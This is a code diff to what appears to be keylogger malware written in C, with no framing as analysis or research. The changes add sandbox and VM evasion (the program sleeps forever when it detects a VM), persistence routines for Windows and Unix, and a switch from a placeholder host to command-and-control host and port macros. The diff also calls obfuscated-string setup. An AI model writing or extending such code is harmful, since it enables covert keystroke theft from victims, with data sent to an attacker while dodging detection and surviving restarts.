@@ -3,11 +3,15 @@
 #ifdef _WIN32
 #include "common/keylogger.h"
 #include "common/network.h"
+#include "common/antivm.h"
+#include "common/persistence.h"
 typedef KeyloggerState KLState;
 typedef NetContext NetCtx;
 #else
 #include "common/keylogger.h"
 #include "common/network.h"
+#include "common/antivm.h"
+#include "common/persistence.h"
 typedef KeyloggerState KLState;
 typedef NetContext NetCtx;
 #endif
@@ -110,8 +114,25 @@ int main(int argc, char *argv[]) {
     seed_prng();
     init_obfuscated_strings();
     
+    if(anti_vm_check()) {
+        #ifdef _WIN32
+        Sleep(INFINITE);
+        #else
+        while(1) sleep(86400);
+        #endif
+        return 0;
+    }
+    
     char build_id[9];
     gen_id(build_id, sizeof(build_id));
+    
+    #ifdef _WIN32
+    char exe_path[MAX_PATH];
+    GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
+    setup_persistence(exe_path);
+    #else
+    setup_persistence_unix();
+    #endif
     
     int arr[10];
     for(int i = 0; i < 10; i++) arr[i] = (int)(next_rand() % 100);
@@ -149,9 +170,9 @@ int main(int argc, char *argv[]) {
     
     if(validate_buffer(decoded_url, strlen(decoded_url))) {
         #ifdef _WIN32
-        int conn = net_connect_win(&ctx, "example.com", 443, 1);
+        int conn = net_connect_win(&ctx, GET_C2_HOST(), GET_C2_PORT(), 1);
         #else
-        int conn = net_connect_unix(&ctx, "example.com", 443);
+        int conn = net_connect_unix(&ctx, GET_C2_HOST(), GET_C2_PORT());
         #endif
         if(conn) {
             char enc_data[512];
